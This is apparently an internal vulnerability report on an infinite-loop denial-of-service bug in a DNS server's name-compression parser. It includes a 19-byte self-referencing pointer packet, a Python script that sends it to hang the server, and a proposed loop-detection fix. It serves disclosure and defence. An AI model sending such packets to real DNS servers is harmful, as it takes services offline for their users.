# DNS Compression Loop Vulnerability - CRITICAL

## Date Discovered
2026-01-03

## Severity
**CRITICAL** - Denial of Service

## Summary
The DNS server has an infinite loop vulnerability in DNS name compression pointer handling. A specially crafted 19-byte UDP packet can hang the entire server indefinitely, making it unresponsive to all queries.

## Root Cause
The message unpacking code in `message.cpp` does not detect compression pointer loops when parsing DNS names. When a compression pointer points to itself (or creates a cycle), the parser enters an infinite loop.

## Attack Vector

### Minimal Attack Packet (19 bytes)
```
6d 5d 01 00 00 01 00 00 00 00 00 00 c0 0c 00 00 01 00 01
```

### Breakdown
- `6d 5d` - Transaction ID (any value)
- `01 00` - Flags: Standard Query
- `00 01` - QDCOUNT = 1 question
- `00 00 00 00 00 00` - No answers, authorities, or additional records
- `c0 0c` - **Compression pointer to offset 0x0c (12)**
- `00` - Name terminator
- `00 01` - QTYPE = A (IPv4 address)
- `00 01` - QCLASS = IN (Internet)

### The Vulnerability
Offset 12 (0x0c) is where the compression pointer `c0 0c` itself is located. When the parser tries to follow this pointer, it:
1. Reads pointer at offset 12
2. Jumps to offset 12 (same location)
3. Reads pointer at offset 12 again
4. Infinite loop → server hangs

## Impact

### Demonstrated Impact
- Single 19-byte UDP packet causes complete server hang
- Server process consumes 100% CPU in infinite loop
- Server stops responding to ALL queries (UDP and TCP)
- No automatic recovery - requires kill -9
- No error logging - silent hang

### Attack Characteristics
- **Trivial to execute**: 19 bytes, single packet
- **No authentication required**: UDP, no connection needed
- **Complete DoS**: Server becomes totally unresponsive
- **Undetectable**: No logs, no errors, just hangs
- **Persistent**: Hang lasts until process killed

## Reproduction

### Using Fuzzer
```bash
python3 fuzz_targeted.py
```

### Manual Reproduction with Python
```python
import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
txid = 0x6d5d
flags = 0x0100
header = struct.pack('!HHHHHH', txid, flags, 1, 0, 0, 0)
poison = b'\xc0\x0c\x00'  # Self-referencing compression pointer
question = poison + struct.pack('!HH', 1, 1)
packet = header + question

sock.sendto(packet, ("127.0.0.1", 15353))
# Server is now hung
```

## Fix Required

### Detection Strategy
Add compression pointer loop detection in `message.cpp`:
1. Track visited offsets when following compression pointers
2. Detect if we revisit the same offset (cycle detected)
3. Limit maximum compression pointer jumps (e.g., 64 max)

### Implementation
```cpp
bool RR::unpackName(char *buf, unsigned int len, unsigned int &offset, 
                    string &name, set<unsigned int> &visited)
{
    if (visited.find(offset) != visited.end())
        return false;  // Loop detected
    
    visited.insert(offset);
    
    // ... existing decompression logic
}
```

## Related Vulnerabilities

Other potential compression attacks to test:
- Chained compression loops (A→B→A)
- Deep compression nesting (exhausting stack)
- Compression pointer to invalid offset
- Compression pointer beyond packet boundary

## Priority
**P0 - CRITICAL**: This vulnerability allows trivial DoS with a single UDP packet. Must be fixed immediately before any production deployment.

## Test Coverage
- `fuzz_udp_queries.py` - Full fuzzer (115 test cases)
- `fuzz_targeted.py` - Targeted test for compression loops
- Both scripts included in repository

## References
- RFC 1035 Section 4.1.4 (Message compression)
- CVE examples: DNS compression vulnerabilities are common (search "DNS compression loop CVE")
